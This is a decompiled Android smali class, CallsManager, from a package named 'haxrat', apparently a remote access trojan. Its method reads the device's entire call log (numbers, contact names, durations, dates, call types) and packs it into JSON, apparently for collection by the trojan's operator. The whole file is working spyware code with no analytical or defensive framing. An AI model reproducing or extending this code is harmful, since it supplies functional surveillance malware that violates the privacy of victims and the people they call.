.class public Lcom/hax4us/haxrat/CallsManager;
.super Ljava/lang/Object;
.source "CallsManager.java"


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 47
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static getCallsLogs()Lorg/json/JSONObject;
    .locals 19

    .prologue
    .line 16
    :try_start_0
    new-instance v12, Lorg/json/JSONObject;

    move-object/from16 v18, v12

    move-object/from16 v12, v18

    move-object/from16 v13, v18

    invoke-direct {v13}, Lorg/json/JSONObject;-><init>()V

    move-object v1, v12

    .line 17
    new-instance v12, Lorg/json/JSONArray;

    move-object/from16 v18, v12

    move-object/from16 v12, v18

    move-object/from16 v13, v18

    invoke-direct {v13}, Lorg/json/JSONArray;-><init>()V

    move-object v2, v12

    .line 19
    const-string v12, "content://call_log/calls"

    invoke-static {v12}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v12

    move-object v3, v12

    .line 20
    invoke-static {}, Lcom/hax4us/haxrat/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v12

    invoke-virtual {v12}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v12

    move-object v13, v3

    const/4 v14, 0x0

    check-cast v14, [Ljava/lang/String;

    const/4 v15, 0x0

    check-cast v15, Ljava/lang/String;

    const/16 v16, 0x0

    check-cast v16, [Ljava/lang/String;

    const/16 v17, 0x0

    check-cast v17, Ljava/lang/String;

    invoke-virtual/range {v12 .. v17}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v12

    move-object v4, v12

    .line 22
    :goto_0
    move-object v12, v4

    invoke-interface {v12}, Landroid/database/Cursor;->moveToNext()Z

    move-result v12

    if-nez v12, :cond_0

    .line 40
    move-object v12, v1

    const-string v13, "callsList"

    move-object v14, v2

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 41
    move-object v12, v1

    move-object v0, v12

    .line 45
    :goto_1
    return-object v0

    .line 23
    :cond_0
    new-instance v12, Lorg/json/JSONObject;

    move-object/from16 v18, v12

    move-object/from16 v12, v18

    move-object/from16 v13, v18

    invoke-direct {v13}, Lorg/json/JSONObject;-><init>()V

    move-object v5, v12

    .line 24
    move-object v12, v4

    move-object v13, v4

    const-string v14, "number"

    invoke-interface {v13, v14}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v12, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    move-object v6, v12

    .line 25
    move-object v12, v4

    move-object v13, v4

    const-string v14, "name"

    invoke-interface {v13, v14}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v12, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    move-object v7, v12

    .line 26
    move-object v12, v4

    move-object v13, v4

    const-string v14, "duration"

    invoke-interface {v13, v14}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v12, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    move-object v8, v12

    .line 27
    move-object v12, v4

    move-object v13, v4

    const-string v14, "date"

    invoke-interface {v13, v14}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v12, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    move-object v9, v12

    .line 29
    move-object v12, v4

    move-object v13, v4

    const-string v14, "type"

    invoke-interface {v13, v14}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v13

    invoke-interface {v12, v13}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12

    move v10, v12

    .line 32
    move-object v12, v5

    const-string v13, "phoneNo"

    move-object v14, v6

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 33
    move-object v12, v5

    const-string v13, "name"

    move-object v14, v7

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 34
    move-object v12, v5

    const-string v13, "duration"

    move-object v14, v8

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 35
    move-object v12, v5

    const-string v13, "date"

    move-object v14, v9

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    move-result-object v12

    .line 36
    move-object v12, v5

    const-string v13, "type"

    move v14, v10

    invoke-virtual {v12, v13, v14}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    move-result-object v12

    .line 37
    move-object v12, v2

    move-object v13, v5

    invoke-virtual {v12, v13}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v12

    goto/16 :goto_0

    .line 41
    :catch_0
    move-exception v12

    move-object v1, v12

    .line 43
    move-object v12, v1

    invoke-virtual {v12}, Lorg/json/JSONException;->printStackTrace()V

    .line 45
    const/4 v12, 0x0

    check-cast v12, Lorg/json/JSONObject;

    move-object v0, v12

    goto/16 :goto_1
.end method
